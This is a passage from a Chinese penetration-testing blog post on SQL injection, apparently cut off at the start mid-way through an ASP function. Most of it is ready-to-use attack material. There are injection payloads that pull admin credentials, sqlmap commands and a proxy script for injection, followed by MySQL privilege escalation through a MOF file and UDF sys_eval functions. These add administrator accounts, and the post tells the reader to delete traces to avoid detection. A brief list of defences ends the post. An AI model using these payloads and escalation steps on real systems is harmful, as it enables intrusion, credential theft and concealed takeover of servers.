<br>ThisChr=Mid(vstrin,i,1)  <br>if Abs(Asc(ThisChr))&lt; &amp;HFF Then  <br>strReturn=strReturn &amp; ThisChr  <br>Else  <br>InnerCode=Asc(ThisChr)  <br>If InnerCode&lt;0 Then  <br>InnerCode=InnerCode + &amp;H10000  <br>End If  <br>Hight1=(InnerCode And &amp;HFF00) \&amp;HFF  <br>Low1=InnerCode And &amp;HFF  <br>strReturn=strReturn &amp; &quot;%&quot; &amp; Hex(Hight1) &amp; &quot;%&quot; &amp; Hex(Low1)  <br>End if  <br>Next  <br>URLEncoding=strReturn  <br>End Function  <br>  <br>%&gt;&lt;/code&gt;&lt;/font&gt;&lt;/strong&gt;<br></code></pre></td></tr></table></figure>
<h3 id="二、手工注入法"><a href="#二、手工注入法" class="headerlink" title="二、手工注入法"></a>二、手工注入法</h3><p>1.<a target="_blank" rel="noopener" href="http://www.xxx.com/play/Diablo.html">http://www.xxx.com/play/Diablo.html</a></p>
<p><code>http://www.xxx.com/down/html/?772.html</code></p>
<p>2.测试注入：</p>
<p><code>http://www.xxx.com/down/html/?772′.html</code></p>
<p><code>http://www.xxx.com /play/Diablo&#39;.html</code></p>
<p><code>http://www.xxx.com/play/Diablo&#39;/**/and /**/1=&#39;1 /*.html</code></p>
<p><code>http://www.xxx.com/play/Diablo&#39; /**/and /**/1=&#39;2 /*.html</code></p>
<p><code>http://www.xxx.com/page/html/?56′/**/and/**/1=1/*.html </code>正常</p>
<p><code>http://www.xxx.com/page/html/?56′/**/and/**/1=2/*.html </code>出错</p>
<p>3.看页面是否存在差异，相同则不存在，不同存在注入。</p>
<p>4.联合查询：</p>
<p><code>http://www.xxx.com/play/diablo’ and 1=2 union select 1,2… frominformation_schema.columns where 1=&#39;1.html</code></p>
<p><code>http://www.xxx.com/page/html/?56&#39;/**/and/**/(SELECT/**/1/**/from/**/(select/**/count(*),concat(floor(rand(0)_2),(substring((select(version())),1,62)))a/**/from/**/information_schema.tables/**/group/**/by/**/a)b)=1/_.html</code></p>
<p>三、手工注入法（二）</p>
<p><code>http://www.xxx.net/news/html/?410.html</code></p>
<p><code>http://www.xxx.net/news/html/?410&#39;union/**/select/**/1/**/from/**/(select/**/count(*),concat(floor(rand(0)*2),0x3a,(select/**/concat(user,0x3a,password)/**/from/**/pwn_base_admin/**/limit/**/0,1),0x3a)a/**/from/**/information_schema.tables/**/group/**/by/**/a)b/**/where&#39;1&#39;=&#39;1.html</code></p>
<p>注：</p>
<p>伪静态的注入和URL的普通GET注入不太相同 。普通url的get注入的%20,%23,+等都可以用；但是伪静态不行，会被直接传递到到url中，所以用&#x2F;**&#x2F;这个注释符号表示空格。</p>
<h3 id="三、SQLmap方法"><a href="#三、SQLmap方法" class="headerlink" title="三、SQLmap方法"></a>三、SQLmap方法</h3><p>在sqlmap中伪静态哪儿存在注入点就加*</p>
<p><code>http://www.cunlide.com/id1/1/id2/2 python  sqlmap.py -u “http://www.xxx.com/id1/1*/id2/2″</code></p>
<p><code>http://www.xxx.com/news/class/?103.htm</code></p>
<p><code>python sqlmap.py -u “http://www.xxx.com/news/class/?103*.html”</code></p>
<h3 id="四、python脚本方法"><a href="#四、python脚本方法" class="headerlink" title="四、python脚本方法"></a>四、python脚本方法</h3><p>代码一：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python">&lt;code <span class="hljs-built_in">id</span>=<span class="hljs-string">&quot;code3&quot;</span>&gt;<span class="hljs-keyword">from</span> BaseHTTPServer <span class="hljs-keyword">import</span> *  <br><span class="hljs-keyword">import</span> urllib2  <br><span class="hljs-keyword">class</span> <span class="hljs-title class_">MyHTTPHandler</span>(<span class="hljs-title class_ inherited__">BaseHTTPRequestHandler</span>):  <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">do_GET</span>(<span class="hljs-params">self</span>):  <br>path=self.path  <br>path=path[path.find(<span class="hljs-string">&#x27;id=&#x27;</span>)+<span class="hljs-number">3</span>:]  <br>proxy_support = urllib2.ProxyHandler(&#123;<span class="hljs-string">&quot;http&quot;</span>:<span class="hljs-string">&quot;http://127.0.0.1:8087&quot;</span>&#125;)  <br>opener = urllib2.build_opener(proxy_support)  <br>urllib2.install_opener(opener)  <br>url=<span class="hljs-string">&quot;http://www.xxx.com/magazine/imedia/gallery/dickinsons-last-dance/&quot;</span>  <br><span class="hljs-keyword">try</span>:  <br>response=urllib2.urlopen(url+path)  <br>html=response.read()  <br><span class="hljs-keyword">except</span> urllib2.URLError,e:  <br>html=e.read()  <br>self.wfile.write(html)  <br>server = HTTPServer((<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-number">8000</span>), MyHTTPHandler)  <br>server.serve_forever()&lt;/code&gt;<br></code></pre></td></tr></table></figure>


<h1 id="SQLMAP使用"><a href="#SQLMAP使用" class="headerlink" title="SQLMAP使用"></a>SQLMAP使用</h1><h1 id="SQL提权"><a href="#SQL提权" class="headerlink" title="SQL提权"></a>SQL提权</h1><h2 id="MySQL提权的必要条件："><a href="#MySQL提权的必要条件：" class="headerlink" title="MySQL提权的必要条件："></a><strong>MySQL提权的必要条件：</strong></h2><ol>
<li><strong>具有MySQL的root权限，且MySQL以system权限运行。</strong></li>
<li><strong>具有执行SQL语句的权限。</strong></li>
</ol>
<p><strong>获取root密码的方法：</strong></p>
<ol>
<li><p>查看数据库配置文件</p>
<p>关键字：<code>config</code>、<code>conn</code>、<code>sql</code>、<code>data</code>、<code>inc</code>、<code>database</code>等</p>
</li>
<li><p>下载mysql安装路径下的数据文件</p>
<ul>
<li>安装路径下的data目录中存放的是数据库的数据信息</li>
<li>root账号密码存储在mysql数据库下的user表中</li>
<li>完整路径&#x3D;安装路径+<code>\data\mysql\user.MYD</code></li>
</ul>
</li>
<li><p>暴力破解</p>
</li>
</ol>
<h3 id="MOF提权"><a href="#MOF提权" class="headerlink" title="MOF提权"></a>MOF提权</h3><p><strong>原理</strong></p>
<p>利用了<code>C:\Windows\System32\wbem\MOF</code>目录下的<code>nullevt.mof</code>文件</p>
<p>利用该文件每分钟会去执行一次的特性，向该文件中写入cmd命令，就会被执行</p>
<p><strong>利用条件</strong></p>
<ol>
<li>只使用于windows系统，一般低版本系统才可以用，比如<code>xp</code>、<code>server2003</code></li>
<li>对<code>C:\Windows\System32\wbem\MOF</code>目录有读写权限</li>
<li>可以找到一个可写目录，写入mof文件</li>
</ol>
<p><strong>提权方法</strong></p>
<ol>
<li><p>在可写目录中上传mof文件。</p>
<p>把mof文件上传到<code>C:/wmpub/nullevt.mof</code></p>
</li>
<li><p>把这个文件复制到<code>C:/Windows/System32/wbem/MOF/nullevt.mof</code>目录下</p>
<figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lasso"><span class="hljs-keyword">select</span> load_file(<span class="hljs-string">&#x27;C:/wmpub/nullevt.mof&#x27;</span>) <span class="hljs-keyword">into</span> dumpfile <span class="hljs-string">&#x27;C:/Windows/System32/wbem/MOF/nullevt.mof&#x27;</span><br></code></pre></td></tr></table></figure>

<p>将下面这段代码复制到mof后缀的文件中</p>
<figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs smali"><br><span class="hljs-comment"># pragma namespace(&quot;\.\root\subscription&quot;)</span><br><span class="hljs-built_in"></span><br><span class="hljs-built_in">instance </span>of EventFilter as $EventFilter&#123; EventNamespace =<span class="hljs-string">&quot;Root\Cimv2&quot;</span>; Name = <span class="hljs-string">&quot;filtP2&quot;</span>; Query = <span class="hljs-string">&quot;Select * From InstanceModificationEvent &quot;</span><br><br><span class="hljs-string">&quot;Where TargetInstance Isa \&quot;</span>Win32_LocalTime\<span class="hljs-string">&quot; &quot;</span><br><br><span class="hljs-string">&quot;And TargetInstance.Second = 5&quot;</span>;<br><br>Query<span class="hljs-class">Language = &quot;WQL&quot;;</span><br><br>&#125;;<br><span class="hljs-built_in"></span><br><span class="hljs-built_in">instance </span>of ActiveScriptEventConsumer as $Consumer<br><br>&#123;<br><br>Name = <span class="hljs-string">&quot;consPCSV2&quot;</span>;<br><br>ScriptingEngine = <span class="hljs-string">&quot;JScript&quot;</span>;<br><br>ScriptText =<br><br><span class="hljs-string">&quot;var WSH = new</span><br><span class="hljs-string"></span><br><span class="hljs-string">ActiveXObject(\&quot;</span>WScript.Shell\<span class="hljs-string">&quot;)\nWSH.run(\&quot;</span>net.exe user admin admin /add<span class="hljs-string">&quot;)&quot;</span>;<br><br>&#125;;<br><span class="hljs-built_in"></span><br><span class="hljs-built_in">instance </span>of __FilterToConsumerBinding<br><br>&#123;<br><br>Consumer = $Consumer;<br><br>Filter = $EventFilter;<br><br>&#125;;<br></code></pre></td></tr></table></figure>

<p>把这个mof文件上传到目标机中，可以修改代码，进行命令执行。</p>
<p>目前mof提权方法用的比较少，建议使用udf脚本进行MySQL数据库提权。</p>
</li>
</ol>
<p><strong>补救措施</strong></p>
<p>当发现服务器被使用mof提权，解决继续执行系统命令的方法：</p>
<ol>
<li>先停止winmgmt服务：<code>net stop winmgmt</code></li>
<li>删除文件夹：<code>C:\Windows\System32\wbem\Repository</code></li>
<li>再重新启动winmgmt服务：<code>net start winmgmt</code></li>
</ol>
<h3 id="UDF提权-用户自定义函数提权"><a href="#UDF提权-用户自定义函数提权" class="headerlink" title="UDF提权(用户自定义函数提权)"></a>UDF提权(用户自定义函数提权)</h3><p><strong>原理</strong></p>
<p>UDF(User Defined Funtion)用户自定义函数，通过添加新的函数，对mysql服务器进行功能扩充。</p>
<p><strong>信息收集</strong></p>
<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-function"><span class="hljs-keyword">select</span> <span class="hljs-title">version</span>()</span>;   <span class="hljs-meta"># 获取数据库版本</span><br><span class="hljs-function"><span class="hljs-keyword">select</span> <span class="hljs-title">user</span>()</span>;  <span class="hljs-meta"># 获取数据库用户</span><br><span class="hljs-keyword">select</span> @@basedir;   <span class="hljs-meta"># 获取数据库安装目录</span><br>show variables like ‘%plugin%’; <span class="hljs-meta"># 查看plugin路径。</span><br></code></pre></td></tr></table></figure>

<h4 id="Windows-UDF提权"><a href="#Windows-UDF提权" class="headerlink" title="Windows UDF提权"></a>Windows UDF提权</h4><p>UDF可以理解为MySQL的函数库，可以利用udf定义的创建函数。想要利用udf，必须上传udf.dll作为udf的执行库。MySQL中支持UDF扩展，使得我们可以调用DLL里面的函数来实现一些特殊的功能。</p>
<p><strong>利用条件</strong></p>
<p>如果mysql版本大于5.1，udf.dll文件必须放置在mysql安装目录的<code>MySQL\Lib\Plugin\</code>文件夹下，该目录默认是不存在的，需要使用webshell找到mysql的安装目录，并在安装目录下创建<code>MySQL\Lib\Plugin\</code>文件夹，然后将udf.dll导入到该目录。</p>
<p>如果mysql版本小于5.1，udf.dll文件在windows server 2003下放置于<code>c:/windows/system32/</code>目录，在windows server 2000下放置在<code>c:/winnt/system32/</code>目录。</p>
<p>掌握mysql数据库的root账户，从而拥有对mysql的insert和delete权限，以创建和抛弃函数。</p>
<p>拥有可以将udf.dll写入相应目录的权限。</p>
<p><strong>基本步骤</strong></p>
<p><strong>DLL文件的获取方法</strong></p>
<p>在<code>sqlmap/data/udf/mysql</code>目录下，在Windows目录中有32位和64位的dll文件（MySQL位数）。</p>
<p>文件夹中的dll文件是通过异或编码的，可以使用<code>sqlmap/extract/cloak.py</code>进行解码</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">python <span class="hljs-regexp">/sqlmap/</span>extra<span class="hljs-regexp">/cloak/</span>cloak.py -d -i <span class="hljs-regexp">/sqlmap/u</span>df<span class="hljs-regexp">/mysql/</span>windows<span class="hljs-regexp">/64/</span>lib_mysqludf_sys.dll_<br></code></pre></td></tr></table></figure>

<ol>
<li><p>将解码后的DLL文件（包含用户自定义函数的DLL文件）上传到可写目录，再导入到<code>MySQL\lib\plugin\</code>中</p>
<p><code>select LOAD_FILE(&#39;C:/可写目录/lib_mysqludf_sys.dll&#39;) into dumpfile &#39;C:/phpStudy2016/MySQL/lib/plugin/lib_mysqludf_sys.dll&#39;;</code></p>
</li>
<li><p>将DLL中的函数引入到MySQL数据库中</p>
<p>创建自定义函数</p>
<p><code>create function sys_eval returns string soname &#39;lib_mysqludf_sys.dll&#39;;</code></p>
<p>创建名为sys_eval的函数，返回值为string类型，调用的文件是lib_mysqludf_sys.dll</p>
<p>注意：需要创建.dll文件中存在的函数，可以使用十六进制编辑器打开.dll文件，查看可以被创建的函数。</p>
</li>
<li><p>使用该函数去执行系统命令提权</p>
<p>查看当前用户权限</p>
<p><code>select sys_eval(&quot;whoami&quot;);</code></p>
<p>创建账号并提升为管理员权限</p>
<p><code>select sys_eval(&quot;net user winhex passw@ord /add&quot;);</code></p>
<p><code>select sys_eval(&quot;net localgroup administrators winhex /add&quot;);</code></p>
</li>
<li><p>将之前引入的函数删除掉</p>
<p>防止被管理员发现，防止其他攻击者使用</p>
<p><code>drop function sys_eval;</code></p>
<p><code>delete from mysql.func where name=&#39;sys_eval&#39;;</code></p>
</li>
</ol>
<h4 id="Linux-UDF提权"><a href="#Linux-UDF提权" class="headerlink" title="Linux UDF提权"></a>Linux UDF提权</h4><p><strong>简述</strong></p>
<p>通过自定义库函数来实现执行任意的命令</p>
<p>包含用户自定义函数的文件为.so文件</p>
<p><strong>要求</strong></p>
<ul>
<li>在my.ini的[mysqld]下，添加secure_file_priv&#x3D;””，不限制导入导出路径</li>
<li>具有数据库root账户的密码，且mysql数据库以root权限运行</li>
<li>具有sql语句的执行权限</li>
<li>导出目录可写</li>
<li>系统中的selinux处于关闭状态</li>
</ul>
<p><strong>提权过程</strong></p>
<ol>
<li><p>查找插件库的路径</p>
<p><code>show variables like &#39;%plugin%&#39;;</code></p>
<p>得到的结果为：</p>
<table>
<thead>
<tr>
<th align="center">Variable_name</th>
<th align="center">Value</th>
</tr>
</thead>
<tbody><tr>
<td align="center">plugin_dir</td>
<td align="center">&#x2F;usr&#x2F;lib64&#x2F;mysql&#x2F;plugin</td>
</tr>
</tbody></table>
</li>
<li><p>找到对应操作系统数据库的UDF库文件</p>
<p><code>sqlmap-master\data\udf\mysql\linux\64</code>下的<code>lib_mysqludf_sys.so_</code>文件</p>
</li>
<li><p>将so文件（UDF库文件）进行16进制编码</p>
</li>
<li><p>将so文件的内容解码，写入到mysql插件库目录中</p>
<p><code>select unhex(&#39;so文件的16进制编码&#39;) into dumpfile &#39;/usr/lib64/mysql/plugin/xxx.so&#39;</code></p>
</li>
<li><p>查看udf库所支持的函数</p>
<p>注意：需要创建.so文件中存在的函数，可以使用十六进制编辑器打开.so文件，查看可以被创建的函数。</p>
</li>
<li><p>创建函数</p>
<p>写入之后，执行创建函数的命令，就会创建一个sys_eval的函数，用来执行系统命令，这个函数执行的系统命令全部都是system权限。</p>
<p><code>create function sys_eval returns string soname &#39;xxx.so&#39;;</code></p>
</li>
<li><p>执行系统命令，提权</p>
<p><code>sys_eval</code>这个函数就可以执行系统命令，括号里输入系统命令即可。</p>
<p>查看当前用户权限</p>
<p><code>select sys_eval(&quot;whoami&quot;);</code></p>
<p>创建账号并提升为管理员权限</p>
</li>
</ol>
<p>不需要判断mysql的版本，直接查看路径，直接写so文件，Linux里面的文件是so文件。</p>
<p>getshell之后，在终端输入whoami，发现只是apache用户权限。</p>
<p>寻找网站的数据库配置文件，查看数据库的账号密码，可以看到账号root密码root。</p>
<p>登录mysql数据库，输入<code>show variables like &#39;%plugin%&#39;;</code>查看plugin路径。</p>
<p>得到的结果为：</p>
<table>
<thead>
<tr>
<th align="center">Variable_name</th>
<th align="center">Value</th>
</tr>
</thead>
<tbody><tr>
<td align="center">plugin_dir</td>
<td align="center">&#x2F;usr&#x2F;lib64&#x2F;mysql&#x2F;plugin</td>
</tr>
</tbody></table>
<p>我们把so文件进行16进制编码，再解码写入目录中，返回为true，写入成功。</p>
<figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lasso"><span class="hljs-keyword">select</span> unhex(<span class="hljs-string">&#x27;so文件的16进制编码&#x27;</span>) <span class="hljs-keyword">into</span> dumpfile <span class="hljs-string">&#x27;/usr/lib64/mysql/plugin/xxx.so&#x27;</span><br></code></pre></td></tr></table></figure>

<p>写入之后，执行创建函数的命令，就会创建一个sys_eval的函数，用来执行系统命令，这个函数执行的系统命令全部都是system权限。</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">create</span> <span class="hljs-keyword">function</span> sys_eval returns <span class="hljs-keyword">string</span> soname <span class="hljs-string">&#x27;xxx.so&#x27;</span>;<br></code></pre></td></tr></table></figure>

<p><code>sys_eval</code>这个函数就可以执行系统命令，括号里输入系统命令即可。</p>
<figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-variable">select</span> <span class="hljs-function"><span class="hljs-title">sys_eval</span>(<span class="hljs-string">&#x27;whoami&#x27;</span>)</span><br></code></pre></td></tr></table></figure>

<h3 id="开机启动项提权"><a href="#开机启动项提权" class="headerlink" title="开机启动项提权"></a>开机启动项提权</h3><p>利用MySQL，将后门写入开机启动项。同时因为是开机自启动，在写入之后，需要重启目标服务器，才可以运行。</p>
<h1 id="SQL注入的防御"><a href="#SQL注入的防御" class="headerlink" title="SQL注入的防御"></a>SQL注入的防御</h1><p>1.不信任用户的输入，对用户的输入进行校验，例如通过正则表达式，限制长度，对单引号双引号进行转换等<br>2.不使用动态拼接sql，考虑使用存储过程进行数据查询存储<br>3.应用异常信息应给出尽可能少的提示，最好使用自定义错误信息<br>4.不使用管理员权限的数据库连接，为每个应用使用单独的权限，有限的数据库连接<br>5.不把机密信息直接存放，对敏感信息进行加密</p>
<p>系统内核溢出漏洞提权、数据库提权、错误的系统配置提权、组策略首选项提权、WEB中间件漏洞提权、DLL劫持提权、滥用高危权限令牌提权、第三方软件&#x2F;服务提权等</p>

                
              </div>
            
            <hr/>
            <div>
              <div class="post-metas my-3">
  
    <div class="post-meta mr-3 d-flex align-items-center">
      <i class="iconfont icon-category"></i>
      

<span class="category-chains">
  
  
    
      <span class="category-chain">
        
  <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" class="category-chain-item">渗透测试</a>
  
  

      </span>
    
  
</span>

    </div>
  
  
    <div class="post-meta">
      <i class="iconfont icon-tags"></i>
      
        <a href="/tags/WEB/" class="print-no-link">#WEB</a>
      
        <a href="/tags/TOP10/" class="print-no-link">#TOP10</a>
      
    </div>
  
</div>


              
  

  <div class="license-box my-3">
    <div class="license-title">
      <div>SQL注入</div>
      <div>https://www.susec.xyz/2024/11/11/SQL注入/</div>
    </div>
    <div class="license-meta">
      
        <div class="license-meta-item">
          <div>作者</div>
          <div>suuuu</div>
        </div>
      
      
        <div class="license-meta-item license-meta-date">
          <div>发布于</div>
          <div>2024年11月11日</div>
        </div>
      
      
      
        <div class="license-meta-item">
          <div>许可协议</div>
          <div>
            
              
              
                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
                    <i class="iconfont icon-by"></i>
                  </span>
                </a>
              
            
          </div>
        </div>
      
    </div>
    <div class="license-icon iconfont"></div>
  </div>



              
                <div class="post-prevnext my-3">
                  <article class="post-prev col-6">
                    
                    
                      <a href="/2024/11/11/Shiro/" title="SHIRO">
                        <i class="iconfont icon-arrowleft"></i>
                        <span class="hidden-mobile">SHIRO</span>
                        <span class="visible-mobile">上一篇</span>
                      </a>
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2024/11/11/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" title="内网信息收集">
                        <span class="hidden-mobile">内网信息收集</span>
                        <span class="visible-mobile">下一篇</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
          </article>
        </div>
      </div>
    </div>

    <div class="side-col d-none d-lg-block col-lg-2">
      
  <aside class="sidebar" style="margin-left: -1rem">
    <div id="toc">
  <p class="toc-header">
    <i class="iconfont icon-list"></i>
    <span>目录</span>
  </p>
  <div class="toc-body" id="toc-body"></div>
</div>



  </aside>


    </div>
  </div>
</div>





  



  



  



  



  







    

    
      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>

    

    
  </main>

  <footer>
    <div class="footer-inner">
  
  
  
  
</div>

  </footer>

  <!-- Scripts -->
  
  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>


  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var subtitle = document.getElementById('subtitle');
      if (!subtitle || !typing) {
        return;
      }
      var text = subtitle.getAttribute('data-typed-text');
      
        typing(text);
      
    })(window, document);
  </script>




  
    <script  src="/js/img-lazyload.js" ></script>
  




  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
    var toc = jQuery('#toc');
    if (toc.length === 0 || !window.tocbot) { return; }
    var boardCtn = jQuery('#board-ctn');
    var boardTop = boardCtn.offset().top;

    window.tocbot.init(Object.assign({
      tocSelector     : '#toc-body',
      contentSelector : '.markdown-body',
      linkClass       : 'tocbot-link',
      activeLinkClass : 'tocbot-active-link',
      listClass       : 'tocbot-list',
      isCollapsedClass: 'tocbot-is-collapsed',
      collapsibleClass: 'tocbot-is-collapsible',
      scrollSmooth    : true,
      includeTitleTags: true,
      headingsOffset  : -boardTop,
    }, CONFIG.toc));
    if (toc.find('.toc-list-item').length > 0) {
      toc.css('visibility', 'visible');
    }

    Fluid.events.registerRefreshCallback(function() {
      if ('tocbot' in window) {
        tocbot.refresh();
        var toc = jQuery('#toc');
        if (toc.length === 0 || !tocbot) {
          return;
        }
        if (toc.find('.toc-list-item').length > 0) {
          toc.css('visibility', 'visible');
        }
      }
    });
  });
</script>


  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>

  <script>Fluid.plugins.codeWidget();</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
    window.anchors.options = {
      placement: CONFIG.anchorjs.placement,
      visible  : CONFIG.anchorjs.visible
    };
    if (CONFIG.anchorjs.icon) {
      window.anchors.options.icon = CONFIG.anchorjs.icon;
    }
    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
    var res = [];
    for (var item of el) {
      res.push('.markdown-body > ' + item.trim());
    }
    if (CONFIG.anchorjs.placement === 'left') {
      window.anchors.options.class = 'anchorjs-link-left';
    }
    window.anchors.add(res.join(', '));

    Fluid.events.registerRefreshCallback(function() {
      if ('anchors' in window) {
        anchors.removeAll();
        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
        var res = [];
        for (var item of el) {
          res.push('.markdown-body > ' + item.trim());
        }
        if (CONFIG.anchorjs.placement === 'left') {
          anchors.options.class = 'anchorjs-link-left';
        }
        anchors.add(res.join(', '));
      }
    });
  });
</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
    Fluid.plugins.fancyBox();
  });
</script>


  <script>Fluid.plugins.imageCaption();</script>

  <script  src="/js/local-search.js" ></script>





<!-- 主题的启动项，将它保持在最底部 -->
<!-- the boot of the theme, keep it at the bottom -->
<script  src="/js/boot.js" ></script>


  

  <noscript>
    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
  </noscript>
</body>
</html>
